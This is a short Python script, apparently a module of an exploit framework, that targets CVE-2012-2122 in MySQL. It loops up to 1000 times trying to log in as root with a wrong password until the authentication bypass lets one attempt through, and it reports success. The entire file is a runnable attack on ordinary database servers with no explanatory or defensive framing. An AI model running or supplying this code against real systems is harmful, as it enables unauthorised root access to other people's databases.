from BaseExploit import *
import numpy as np
import pymysql

def CVE_2012_2122(host, port):
    for i in range(1000):
        try:
            db = pymysql.connect(host=host,port=port,
                                user='root',
                                password='wrong',
                                database='KADB')
        except:
            time.sleep(np.random.random()*0.1)
            continue
        # print("success")
        return True
    return False

Exploit(CVE_2012_2122, args.host, args.port)()